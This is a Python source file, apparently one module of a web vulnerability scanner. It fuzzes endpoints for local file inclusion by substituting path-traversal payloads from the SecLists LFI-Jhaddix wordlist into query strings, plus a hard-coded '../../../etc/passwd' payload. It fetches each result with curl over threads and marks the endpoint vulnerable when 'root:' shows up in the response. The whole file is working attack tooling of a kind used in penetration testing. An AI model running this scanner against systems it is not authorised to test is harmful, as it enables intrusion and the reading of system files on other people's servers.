import os
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import methods 
import threads
import time

class lfi:

    def __init__(self,end_points,threads,delay):
        self.end_points=end_points
        self.reports={}
        self.errors = {'end_points':[],'general':[]}
        self.threads=threads
        self.delay=delay

    def get_payloads(self):
        return methods.get_file_content("/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt")
    
    def modify_endpoint(self,end_point,payload):
        return methods.qsreplace(end_point,payload).strip()
        
    def curl_execute(self,end_point):
        _,out,err=methods.execute_command(f"curl -s -L -H 'User-Agent: Mozilla/5.0' --insecure '{end_point}'")
        if not err:
            return out
        else:
            return False
    
    def list_search(self,keywords,lst):
        for keyword in keywords:
            if keyword in lst:
                return True
        return False
    
    def test_payload(self,end_point,payload):
        is_done=False
        error=None
        modify_result = self.modify_endpoint(end_point,payload)
        curl_result = self.curl_execute(modify_result)
        if curl_result:
            search_result = self.list_search(["root:"],curl_result)
            if search_result:
                self.reports[end_point]=(payload,curl_result)
                is_done=True
        return [is_done,error]
            
    def is_vuln(self,end_point):
        return end_point in self.reports      
    
    def lfi(self,end_point,requests_num,delay):
        try:
            print('LFI Testing')
            payloads = self.get_payloads()
            payloads.append('/var/www/images/../../../etc/passwd')
            iterations = len(payloads)//requests_num
            for i in range(iterations+1):
                thread_objects = []
                for payload in payloads[:requests_num]:
                    t = threads.thread(self.test_payload,(end_point,payload))
                    thread_objects.append(t)
                threads.join_threads(thread_objects)
                if self.is_vuln(end_point):
                    return
                payloads = payloads[requests_num:]
                time.sleep(delay)
            if not self.is_vuln(end_point):
                self.errors['end_points'].append(end_point) 
        except:
            self.errors['general'].append(end_point)
    
    def llfi(self):
        print("[‚óè] Vulnerabilities Scanning  -  LFI")
        try:
            iterations = len(self.end_points)//self.threads
            for i in range(iterations+1):
                thread_objects = []
                for end_point in self.end_points:
                    t = threads.thread(self.lfi,(end_point,50,1))
                    thread_objects.append(t)
                threads.join_threads(thread_objects)
                time.sleep(self.delay)
        except Exception as e:
            self.errors['General'] = e 

